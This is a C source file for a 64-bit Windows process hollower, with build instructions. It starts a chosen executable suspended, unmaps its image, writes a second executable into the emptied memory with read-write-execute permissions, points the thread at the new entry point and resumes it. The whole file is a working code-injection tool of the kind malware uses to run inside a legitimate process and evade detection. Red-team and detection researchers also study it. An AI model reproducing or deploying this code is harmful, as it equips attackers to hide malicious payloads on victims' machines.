/*
    A 64 bit Process Hollower that Launches a process, hollows out the image, inserts a new image in its place and launches its code.
	If you are building this in MinGW GCC, it doesn't by default link to ntdll.dll which is where NtQueryInformationProcess() API is located
	which is used in the code, so need to tell the linker explicitly to link ntdll.dll to your binary. I do that by building the binary with the following command:
	
	gcc processhollower.c -Wl,C:\Windows\System32\ntdll.dll -o processhollower.exe -m64
	
*/

#include<malloc.h>
#include<Windows.h> //Recursively includes ddk\ntimage.h which contains all the necessary PE structs
#include<stdio.h>
#include<winternl.h> //Only for NtQueryInformationProcess Prototype


PIMAGE_OPTIONAL_HEADER GetOptionalHeader(char *buffer)
{
	return (PIMAGE_OPTIONAL_HEADER)((buffer + (((PIMAGE_DOS_HEADER)(buffer))->e_lfanew))+0x18);
}

PIMAGE_SECTION_HEADER GetSectionHeader(char *buffer)
{
	return (PIMAGE_SECTION_HEADER)(((PIMAGE_OPTIONAL_HEADER)((buffer + (((PIMAGE_DOS_HEADER)(buffer))->e_lfanew))+0x18))+1);
}

WORD GetNumberOfSections(char *buffer)
{
	return (WORD)(((PIMAGE_FILE_HEADER)((buffer + (((PIMAGE_DOS_HEADER)(buffer))->e_lfanew))+4))->NumberOfSections);
}

DWORD AlignedSectionSize(DWORD SectionSize, DWORD Alignment)
{
	ULONG align= (SectionSize/Alignment);
	return (align+1)*Alignment;
}

typedef NTSTATUS (NTAPI *pZwUnmapViewOfSection)(
	HANDLE ProcessHandle, 
	PVOID BaseAddress
);


typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

int main(int argc, char **argv)
{
	
	if(argc!=3)
	{
		printf("Usage: ProcessHollower.exe Path\\To\\Hollowed\\image Path\\To\\Injected\\Image.");
		return 0;
	}
	
	char *hollowed, *hollower;
	hollowed= argv[1];
	hollower= argv[2];
	
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
	
	ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    
	//BOOL status= CreateProcessA(hollowed,NULL,NULL,NULL,TRUE,CREATE_NEW_CONSOLE | CREATE_SUSPENDED,NULL,NULL,&si,&pi);
	BOOL status= CreateProcessA(hollowed,NULL,NULL,NULL,TRUE, CREATE_SUSPENDED,NULL,NULL,&si,&pi);
    if(status==FALSE)
	{
		printf("Failed to create process. Exiting..");
		return 0;
	}

    PROCESS_BASIC_INFORMATION ProcessInformation; ULONG ReturnLength;
	pNtQueryInformationProcess NtQueryInformationProcess = 
    (pNtQueryInformationProcess)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"
	);

	if (NtQueryInformationProcess == NULL) 
	{
		printf("Failed to resolve NtQueryInformationProcess\n");
		return -1;
	}
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &ProcessInformation, sizeof(PROCESS_BASIC_INFORMATION), &ReturnLength); //Querying Process For Accessing PEB which stores the ImageBase of Hollowed at 0x16 Offset
	unsigned __int64 OriginalImageBaseAddress;
    status= ReadProcessMemory(pi.hProcess, (LPVOID)((unsigned __int64 *)((&ProcessInformation)->PebBaseAddress)+2), &OriginalImageBaseAddress, 8, NULL); //Reading ImageBase value (8 bytes) and stroring it in OriginalImageBaseAddress
	
	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, (LPCONTEXT)&context); //Getting Thread Context of the suspended Hollowed process
    pZwUnmapViewOfSection ZwUnmapViewOfSection = 
    (pZwUnmapViewOfSection)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), 
        "ZwUnmapViewOfSection"
    );

	if (!ZwUnmapViewOfSection) {
		printf("[-] Failed to resolve ZwUnmapViewOfSection\n");
		return -1;
	}

	
	NTSTATUS unmapstat= ZwUnmapViewOfSection(pi.hProcess, (PVOID)(*(unsigned __int64 *)((unsigned __int64 *)&context+16))); // Unmapping/Hollowing out the Hollowed by passing in the EntryPoint value which is found at an offset of 8*sizeof(unsigned __int64) in the received context structure
	
	FILE *fileptr;
    char *buffer, *SectionBuffer;
    long filelen;
	
	fileptr = fopen(hollower,"rb");
	fseek(fileptr, 0, SEEK_END);
	filelen = ftell(fileptr); 
	rewind(fileptr);
	buffer = (char *)malloc(filelen * sizeof(char)); // Enough memory for the PE (on disk) of Hollower
	fread(buffer, filelen, 1, fileptr); // Read in the PE on disk file for Hollower
	fclose(fileptr);
    
    PIMAGE_OPTIONAL_HEADER OptionalHeader= GetOptionalHeader(buffer); 
	ULONG RelocTableBase= ((PIMAGE_DATA_DIRECTORY)(OptionalHeader->DataDirectory)+5)->VirtualAddress; 
	WORD NumberOfSections= GetNumberOfSections(buffer);

char *mem= (char *)VirtualAllocEx(pi.hProcess, (PVOID)(OriginalImageBaseAddress), OptionalHeader->SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //Allocating memory in the at the ImageBase of the Hollowed image to inject Hollower image

if(mem==NULL) {
   printf("Failed to Allocate Memory in the Process that is being hollowed. Exiting..");
   return 0;
}
DWORD SectionVirtualSize;
SectionVirtualSize= AlignedSectionSize(OptionalHeader->SizeOfHeaders, OptionalHeader->SectionAlignment);

SectionBuffer= (char *)malloc(SectionVirtualSize * sizeof(char));
memcpy(SectionBuffer, buffer, OptionalHeader->SizeOfHeaders);
ZeroMemory(SectionBuffer+(OptionalHeader->SizeOfHeaders), SectionVirtualSize-(OptionalHeader->SizeOfHeaders));

BOOL WriteStatus= WriteProcessMemory(pi.hProcess, mem, SectionBuffer, SectionVirtualSize, NULL);

if(WriteStatus==0)
{
	printf("Failure to write Hollower Application Header to Process memory. Exiting..");
	return 0;
}
mem= mem+SectionVirtualSize;
free(SectionBuffer);

PIMAGE_SECTION_HEADER SectionHeader= GetSectionHeader(buffer);
unsigned short i;
for(i=0;i<NumberOfSections;i++) {
  
         SectionVirtualSize= AlignedSectionSize(SectionHeader->Misc.VirtualSize,OptionalHeader->SectionAlignment);
         SectionBuffer= (char *)malloc(SectionVirtualSize * sizeof(char));		 
         memcpy(SectionBuffer,(buffer+SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData);
         ZeroMemory(SectionBuffer+(SectionHeader->SizeOfRawData), SectionVirtualSize-(SectionHeader->SizeOfRawData));
         WriteStatus= WriteProcessMemory(pi.hProcess, mem, SectionBuffer, SectionVirtualSize, NULL);
		 free(SectionBuffer);
         mem= mem+SectionVirtualSize;
		 SectionHeader= SectionHeader+1;
}

//This section after fixes up the relocation table entries by iterating through the BaseReloc table. Apparently isn't needed as the loader fixes up the relocations itself after Thread is resumed. Commenting the block out.

/*
PIMAGE_DATA_DIRECTORY RelocDirectory= (PIMAGE_DATA_DIRECTORY)(OptionalHeader->DataDirectory)+5;

if(RelocDirectory->VirtualAddress != 0)
{
DWORD TotalRelocSize= RelocDirectory->Size;
//PIMAGE_BASE_RELOCATION RelocBlock= (PIMAGE_BASE_RELOCATION)(buffer+(RelocDirectory->VirtualAddress));

PIMAGE_BASE_RELOCATION RelocBlock = (PIMAGE_BASE_RELOCATION)malloc(TotalRelocSize);
status= ReadProcessMemory(pi.hProcess, (LPVOID)(OriginalImageBaseAddress+(RelocDirectory->VirtualAddress)), RelocBlock, TotalRelocSize, NULL);
DWORD IncrementalRelocSize= 0;
PRelocEntry RelEntry; unsigned __int64 RelocOrigQWord, RelocEditQWord;

while(IncrementalRelocSize < TotalRelocSize)
 {
	 RelEntry= (PRelocEntry)((char *)RelocBlock+8);
	 
	 for(i=0; i< (((RelocBlock->SizeOfBlock)-8)/sizeof(USHORT)); i++) {
	   	 
		 if(RelEntry->Type != 0) {
			 
			 if(((RelocBlock->VirtualAddress)+(RelEntry+i)->Offset)==0x122FA0)
			 {
				 continue;
			 }
		         ReadProcessMemory(pi.hProcess, (LPVOID)(OriginalImageBaseAddress+(RelocBlock->VirtualAddress)+(RelEntry+i)->Offset), &RelocOrigQWord, 8, NULL);
				 RelocEditQWord= RelocOrigQWord-(unsigned __int64)(OptionalHeader->ImageBase)+(unsigned __int64)OriginalImageBaseAddress;
				 WriteProcessMemory(pi.hProcess,(LPVOID)(OriginalImageBaseAddress+(RelocBlock->VirtualAddress)+(RelEntry+i)->Offset), &RelocEditQWord, 8, NULL);
		 }
	 }
	 
	 IncrementalRelocSize= IncrementalRelocSize+(RelocBlock->SizeOfBlock);
	 RelocBlock= (PIMAGE_BASE_RELOCATION)((char *)RelocBlock+(RelocBlock->SizeOfBlock));
 }
}
*/

GetThreadContext(pi.hThread, (LPCONTEXT)&context); //not really needed as the context structure still exists on stack. Calling GetThreadContext() anyway for redundancy purpose. Feel free to comment it out.
*(unsigned __int64 *)((unsigned __int64 *)&context+16)= OriginalImageBaseAddress+(OptionalHeader->AddressOfEntryPoint); //Setting thread context to EntryPoint of Hollower Image
SetThreadContext(pi.hThread, &context); 
ResumeThread(pi.hThread); //Resuming Thread
return 1;
}


